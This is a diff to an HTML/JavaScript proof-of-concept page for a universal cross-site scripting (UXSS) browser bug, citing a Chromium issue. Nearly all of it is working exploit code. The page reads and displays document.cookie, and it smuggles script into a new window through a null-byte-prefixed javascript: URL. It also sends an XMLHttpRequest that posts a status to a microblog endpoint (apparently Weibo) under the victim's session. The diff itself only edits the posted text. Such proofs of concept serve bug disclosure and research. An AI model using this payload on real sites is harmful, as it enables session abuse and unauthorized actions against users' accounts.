@@ -12,7 +12,7 @@ function woc(){
 alert(document.location+'/ncookie:/n'+document.cookie);
 }
 function faweibo(){
-var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){alert('uxss!',xhr.responseText);}};xhr.open('POST','/aj/mblog/add?_wv=5&__rnd=1409792585330', true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('text=UXSS https://code.google.com/p/chromium/issues/detail?id=37383');
+var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){alert('uxss!',xhr.responseText);}};xhr.open('POST','/aj/mblog/add?_wv=5&__rnd=1409792585330', true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('text=@xavierskip UXSS https://code.google.com/p/chromium/issues/detail?id=37383');
 }
 </script>
 
@@ -28,4 +28,4 @@ onclick=window.open('javascript:alert%28document.cookie%29','t1')>
 onclick=window.open('\x00javascript:alert%28document.cookie%29','t1')>
 
 <input type=button value="BUG:new window send cookie"
-onclick=window.open('\x00javascript:var%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Balert%28%27uxss%21%27%2Cxhr.responseText%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2C%27/aj/mblog/add%3F_wv%3D5%26__rnd%3D1409792585330%27%2C%20true%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28%27text%3DUXSS%20https%3A//code.google.com/p/chromium/issues/detail%3Fid%3D37383%27%29%3B','t1')>
+onclick=window.open('\x00javascript:var%20xhr%3Dnew%20XMLHttpRequest%28%29%3Bxhr.onreadystatechange%3Dfunction%28%29%7Bif%28xhr.readyState%3D%3D4%29%7Balert%28%27uxss%21%27%2Cxhr.responseText%29%3B%7D%7D%3Bxhr.open%28%27POST%27%2C%27/aj/mblog/add%3F_wv%3D5%26__rnd%3D1409792585330%27%2C%20true%29%3Bxhr.setRequestHeader%28%27Content-type%27%2C%27application/x-www-form-urlencoded%27%29%3Bxhr.send%28%27text%3D@xavierskip%20UXSS%20https%3A//code.google.com/p/chromium/issues/detail%3Fid%3D37383%27%29%3B','t1')>
